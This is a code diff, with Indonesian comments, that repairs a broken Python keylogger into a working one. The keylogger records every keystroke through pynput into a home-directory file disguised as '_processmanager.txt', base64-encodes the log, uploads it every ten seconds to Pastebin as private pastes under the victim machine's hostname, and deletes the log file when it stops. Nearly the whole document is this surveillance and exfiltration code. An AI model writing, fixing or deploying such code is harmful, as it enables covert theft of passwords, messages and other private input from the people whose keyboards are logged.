@@ -1,4 +1,4 @@
-#!usrbinpython3
+#!/usr/bin/python3
 
 import os
 import time
@@ -7,123 +7,130 @@ import requests
 import base64
 from pynput.keyboard import Listener
 
-# Kelas utama untuk menangkap dan menyimpan log dari penekanan tombol
-class Key()
-    keys = []
-    count = 0
-    flag = 0
-    hostname = os.uname().nodename  # Mendapatkan nama komputer di Linux
-    path = os.path.join(os.path.expanduser(~), f{hostname}_processmanager.txt)
+class KeyLogger:
+    def __init__(self):
+        self.keys = []
+        self.count = 0
+        self.flag = False
+        self.hostname = os.uname().nodename
+        self.path = os.path.join(os.path.expanduser("~"), f"{self.hostname}_processmanager.txt")
 
-    # Fungsi untuk menangkap penekanan tombol
-    def on_press(self, key)
+    def on_press(self, key):
+        """Menangkap input keyboard dan menyimpannya ke file."""
         self.keys.append(key)
         self.count += 1
 
-        if self.count = 1
+        if self.count >= 1:
             self.count = 0
             self.write_file(self.keys)
             self.keys = []
 
-    # Fungsi untuk membaca isi log dari file
-    def read_logs(self)
-        if os.path.exists(self.path)
-            with open(self.path, 'rt') as f
+    def read_logs(self):
+        """Membaca isi file log."""
+        if os.path.exists(self.path):
+            with open(self.path, 'rt') as f:
                 return f.read()
         return None
 
-    # Fungsi untuk menulis log penekanan tombol ke file
-    def write_file(self, keys)
-        with open(self.path, 'a') as f
-            for key in keys
-                k = str(key).replace(', )
-                if k.find(backspace)  0
-                    f.write(BackSpace)
-                elif k.find('enter')  0
-                    f.write(n)
-                elif k.find(shift)  0
-                    f.write(Shift)
-                elif k.find(space)  0
-                    f.write( )
-                elif k.find(caps_lock)  0
-                    f.write( caps_lock )
-                else
+    def write_file(self, keys):
+        """Menyimpan input keyboard ke dalam file log."""
+        with open(self.path, 'a') as f:
+            for key in keys:
+                k = str(key).replace("'", "")
+                if "backspace" in k:
+                    f.write("|BackSpace|")
+                elif "enter" in k:
+                    f.write("\n")
+                elif "shift" in k:
+                    f.write("|Shift|")
+                elif "space" in k:
+                    f.write(" ")
+                elif "caps_lock" in k:
+                    f.write("|CapsLock|")
+                else:
                     f.write(k)
 
-    # Fungsi untuk menghentikan keylogger dan menghapus file log
-    def self_destruct(self)
-        self.flag = 1
+    def self_destruct(self):
+        """Menghentikan keylogger dan menghapus file log."""
+        self.flag = True
         self.listener.stop()
-        if os.path.exists(self.path)
+        if os.path.exists(self.path):
             os.remove(self.path)
-        else
-            print(File tidak ditemukan.)
 
-    # Fungsi untuk memulai keylogger
-    def start(self)
-        self.listener = Listener(on_press=self.on_press)
-        self.listener.start()
+    def start(self):
+        """Menjalankan keylogger."""
+        with Listener(on_press=self.on_press) as self.listener:
+            self.listener.join()
 
-# Fungsi untuk mengirim log ke Pastebin
-def plain_paste(title, contents)
-    username = username
-    password = password
-    api_dev_key = pastebin_api_dev_key
+def send_to_pastebin(title, contents):
+    """Mengirim log ke Pastebin."""
+    api_dev_key = "pastebin_api_dev_key"
+    username = "username"
+    password = "password"
 
-    login_url = httpspastebin.comapiapi_login.php
+    login_url = "https://pastebin.com/api/api_login.php"
     login_data = {
-        api_dev_key api_dev_key,
-        api_user_name username,
-        api_user_password password
+        "api_dev_key": api_dev_key,
+        "api_user_name": username,
+        "api_user_password": password
     }
 
-    # Login ke Pastebin untuk mendapatkan user key
-    r = requests.post(login_url, data=login_data)
-    api_user_key = r.text
+    try:
+        r = requests.post(login_url, data=login_data)
+        if r.status_code != 200:
+            print("Login ke Pastebin gagal.")
+            return
+        
+        api_user_key = r.text
 
-    # Encode isi log dengan base64 sebelum dikirim ke Pastebin
-    encoded_contents = base64.b64encode(contents.encode('utf-8')).decode('utf-8')
+        encoded_contents = base64.b64encode(contents.encode('utf-8')).decode('utf-8')
+        paste_url = "https://pastebin.com/api/api_post.php"
+        paste_data = {
+            "api_paste_name": title,
+            "api_paste_code": encoded_contents,
+            "api_dev_key": api_dev_key,
+            "api_user_key": api_user_key,
+            "api_option": 'paste',
+            "api_paste_private": 2,
+        }
 
-    # Kirim log ke Pastebin sebagai paste baru
-    paste_url = httpspastebin.comapiapi_post.php
-    paste_data = {
-        api_paste_name title,
-        api_paste_code encoded_contents,
-        api_dev_key api_dev_key,
-        api_user_key api_user_key,
-        api_option 'paste',
-        api_paste_private 2,
-    }
+        r = requests.post(paste_url, data=paste_data)
+        if r.status_code == 200:
+            print(f"Log berhasil diupload ke Pastebin: {r.text}")
+        else:
+            print("Gagal mengupload log ke Pastebin.")
 
-    r = requests.post(paste_url, data=paste_data)
-    if r.status_code == 200
-        print(fLog berhasil diupload ke Pastebin {r.text})
-    else
-        print(fGagal mengupload log ke Pastebin {r.status_code})
+    except requests.exceptions.RequestException as e:
+        print(f"Error koneksi ke Pastebin: {e}")
 
-def stop_keylogger(logkey)
-    input(Tekan Enter untuk menghentikan keylogger...n)
-    logkey.flag = 1
+def stop_keylogger(logger):
+    """Menunggu input pengguna untuk menghentikan keylogger."""
+    input("Tekan Enter untuk menghentikan keylogger...\n")
+    logger.flag = True
 
-# Fungsi utama
-if __name__ == __main__
-    logkey = Key()
-    t1 = threading.Thread(target=logkey.start)
-    t2 = threading.Thread(target=stop_keylogger, args=(logkey,))
+if __name__ == "__main__":
+    logger = KeyLogger()
+    t1 = threading.Thread(target=logger.start, daemon=True)
+    t2 = threading.Thread(target=stop_keylogger, args=(logger,))
 
     t1.start()
     t2.start()
 
-    while logkey.flag != 1
-        time.sleep(10)
-        logs = logkey.read_logs()
+    try:
+        while not logger.flag:
+            time.sleep(10)
+            logs = logger.read_logs()
 
-        if logs
-            plain_paste(fKeylogger Logs dari {logkey.hostname}, logs)
-            print(Log dikirim ke Pastebin)
-        else
-            print(Tidak ada log untuk dikirim.)
+            if logs:
+                send_to_pastebin(f"Keylogger Logs dari {logger.hostname}", logs)
+                print("Log dikirim ke Pastebin")
+            else:
+                print("Tidak ada log untuk dikirim.")
 
-    logkey.self_destruct()
-    t1.join()
-    t2.join()
+    except KeyboardInterrupt:
+        print("\nKeylogger dihentikan oleh pengguna.")
+
+    finally:
+        logger.self_destruct()
+        t1.join()
+        t2.join()
